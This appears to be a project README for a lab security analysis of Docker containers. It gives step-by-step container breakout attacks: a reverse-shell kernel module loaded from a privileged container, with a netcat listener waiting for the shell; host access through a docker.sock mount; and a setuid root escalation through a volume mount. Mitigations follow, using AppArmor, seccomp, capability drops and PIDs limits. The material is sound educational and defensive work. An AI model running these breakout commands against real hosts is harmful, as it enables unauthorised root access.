# Security Analysis of Containerized Applications in a Virtualized Environment

> A security analysis conducted on containerised applications in virtualised environments.

## Introduction

Containerization is defined as a form of operating system virtualization, through which applications are run in isolated user spaces called containers, all using the same shared operating system (OS).The concept of Containerization is used in many fields such as DevOps, Microservice Architecture, Web servers and Database Sharding. This makes security a major concern.

This aim for this project is to conduct a Security Analysis of Containerized Applications in Virtualized Environments to check for vulnerabilities in the host Operating System by using several methods such as inspecting the Network bridge between the Virtualized and Host Operating System, Figuring Kernel Level Virtualization Errors, Creating a Malicious Application and Test a proof of concept, if the Host OS can be accessed from a container that is running in a virtualized environment.

 > Containerization Tool used for this Analysis is Docker

## Attack Vectors

### 1. Modifying Kernel Space using --privileged flag

> This attack is to simulate Container Breakout and the process through which an attacker who has gained access of a Container running on a System can get access to a system can load a kernel module on to the Host Kernel Space through the Container to get a reverse shell session of the Host file System mounted on the root directory.

**Steps**

1. Change the directory to *reverseshell* and run the command *make* to build the Kernel File.
   ```bash
   cd reverseshell
   make
   ```
2. Start a Python Server in the *reverseshell* directory using the command:
   ```bash
   python3 -m http.server
   ```
3. On a New Terminal Tab Run a Base container (here alpine) with a privileged flag and start a shell session in it using the command:
   ```bash
   docker run --rm --privileged -it alpine sh
   ```
4. Fetch the Kernel File from the server started in Step 2 using the command 
   ```bash
   wget http://172.17.0.1:8000/reverseshell_module.ko
   ```
5. Give Executable Permission to the Kernel File inside the Container using the command 
   ```bash
   chmod +x reverseshell_module.ko
   ```
6. On a New Terminal Start a Port listener on Port number 4444 as specified in the Kernel Module C Program using the command: 
   ```bash
   nc -nlvp 4444
   ```
7. Inside the Container shell of Step 3 write the Kernel Module into the Kernel Space using the command:
   ```bash
   insmod reverseshell_module.ko
   ```
**Result**

> Upon following the above a Shell session of the Host File System mounted on the root directory is received on the Port listener. This even provides privileges to access, read and modify files through the reverse shell session. This can be classified as a high level vulnerability.

---

### 2. Container Breakout through Docker Socket

> This attack is to simulate how container breakout can be performed using docker.sock mount through which an attacker that has access to the Container can start another Container mounted on the host Root directory to access the Host file system.

**Step**

1. Start a Docker Container mounted on the Docker socket file at `/var/run/docker.sock` using the command:
   ```bash
   docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock alpine sh
   ```
2. Check for the docker.sock file in the Container File System through the command:
   ```bash
   ls /var/run/docker.sock
   ```
3. Update apk and install docker engine on the Container file system to start another container on the Host from inside a Container namespace through the commands:
   ```bash
   apk update
   apk add -U docker
   ```
4. Start a new container by explicitly defining the docker socket extension using the command:
   ```bash
   docker -H unix:///var/run/docker.sock run -it -v /:/test:ro -t alpine sh
   ```

**Result**

> The container started from inside the namespace of another container mounted on the root directory of the host and stored in the test directory of the container file system provided a medium to access the host file system. It is a Read Only File System so it can be classified as a Low graded High Level Vulnerability as it has access to host file system data but, cannot make any modifications.

---

### 3. Privilege Escalation using volume mounts

> Docker daemon requires root privileges to perform some if it’s operations so it runs with root privileges. If a user is part of the Docker Group it is possible for them to elevate their privileges to root. This can be done through Docker volumes and setuid binaries. Docker volumes are a way to provide persistent storage to Docker Containers. When a binary is created and a setuid bit is set on it, it continues to run as root even when a low privileged user uses it.

**Steps**

1. Change the directory to privesc and build the Docker image with the command:
   ```bash
   docker build --rm -t privesc .
   ```
2. Build the Docker container by mounting the */tmp* directory of the host to the */shared* directory of the Container and executing the shellscript.sh using the command:
   ```bash
   docker run -v /tmp:/shared/ privesc:latest /bin/sh shellscript.sh
   ```
3. Navigate to the /tmp directory and execute the shell which gives us a bash shell session with root privileges

**Result**

> The reason it will be possible to gain root privileges is because a volume was mounted from the host to the container and containers run with root privileges by default. The shell executable set the user id to 0 and gave us a bash shell so essentially we setuid binary of a volume which appears as the setuid binary of the host.

---

### 4. Control Group Vulnerability

> Control groups are a feature of the Linux Kernel. It allows to limit the access processes and containers have to system resources such as CPU, RAM, IOPS and network. Here our concern is to limit the PIDs to prevent fork bomb attack.

**Steps**

1. Start a base alpine container using the command:
   ```bash
   docker run -itd --name=cgroups alpine
   ```
2. Navigate to the directory names `/sys/fs/cgroup/pids/docker/` followed by the SHA key returned in Step 1
3.  Examine the contents of the pids.max file

**Result**

> Here it is set to max which means we can fork unlimited processes from this container which can be catastrophic if the container is attacked and the attacker decides to run a fork bomb attack to exhaust all System resources which might result in System failure, which can be a financial disaster in Multinational Companies providing services.

## Defense Mechanisms

### 1. Apparmor Profile

> AppArmor or Application Armor is a Linux Security module. It allows us to limit programs capabilities using Apparmor profiles, and can be used to protect Docker from various security threats. To use it with Docker each Docker container must have its own Apparmor Security Profile. When we start a container, we must provide a custom Apparmor Profile to it and Docker expects to find an Apparmor policy loaded and enforced.

**Steps**

1.  Navigate to the apparmor directory using the command:
    ```bash
    cd apparmor
    ```
2. Load the apparmor profile using the command
   ```bash
   sudo apparmor_parser -r -W apparmor-profile
   ```
3. Start a container by specifying apparmor as the security option and apparmor-profile as the custom apparmor profile using the command:
   ```bash
   docker run -it --security-opt apparmor=apparmor-profile alpine sh
   ```

**Result**

> As we can observe that as specified in the apparmor-profile we cannot write anything in the /tmp directory neither can we perform any operation on the /etc/passwd file but since there were no rules specified for the /etc/shadow file we can view its contents.

---

### 2. Seccomp Profiles

> Seccomp is a Linux security feature that can filter system calls issued by a program and acts as a firewall for them. Seccomp profiles can be specified for containers specifying what system calls can be issued from within the container.

**Steps**

1. Navigate to the seccomp directory
   ```bash
   cd seccomp
   ```
2. Start a container with seccomp as the security option and seccomp-profile.json as the custom seccomp profile to be used using the command:
   ```bash
   docker run -it --security-opt seccomp=seccomp-profile.json alpine sh
   ```
   
**Result**

> As it can be observed that the system call for chmod was denied permission as it has been explicitly specified in the seccomp-profile.json whereas chown was successful as there are no specifications for it.

---

### 3. Capability Specifications

> We can add or drop specific capabilities that the docker container holds, to ensure security and no unexpected behaviour.

**Steps**

1. Start a docker container by explicitly dropping the capability of chwon using the following command:
   ```bash
   docker run --rm -it --cap-drop CHOWN alpine sh
   ```
2. Attempt to create a new file using touch and using chown on it.
   ```bash
   touch /tmp/file.txt
   chown nobody /tmp/file.txt
   ```
 
**Result**

> The result is evident that the chown capability is not provided to the container as the system call failed. This can be used to specify capabilities to be added and removed from docker images while building containers rather than having to provide separate seccomp profiles for each container by making different images according to the requirements.

---

### 4. Cgroup PIDs Limit

> To prevent Fork bomb attacks on Host systems a Process limit can be specified for containers using the --pids-limit flag in Docker. They reflect changes in the pids.max file of the cgroup directory of the container.

**Steps**

1. Start a container shell and specify the pids limit as 6 using the command:
   ```bash
   docker run -it --pids-limit 6 alpine sh
   ```
2. On a new Terminal Tab run the command:
   ```bash
   docker stats
   ```
3. Run 6 sleep proccesses using the command:
   ```bash
   sleep 600 & sleep 600 & sleep 600 & sleep 600 & sleep 600 & sleep 600
   ```
   
**Result**

> It can be observed that the PIDS changed from 1 to 6 after running the sleep commands. Each command was executed one after the other so it forked for the first 5 sleep commands but when it reached its maximum limit it raised an error saying Resource unavailable. This method can be used for mitigating Fork bomb attacks on Docker Containers and prevents system resource Exhaustion and can also help in preventing against DDoS Attacks.
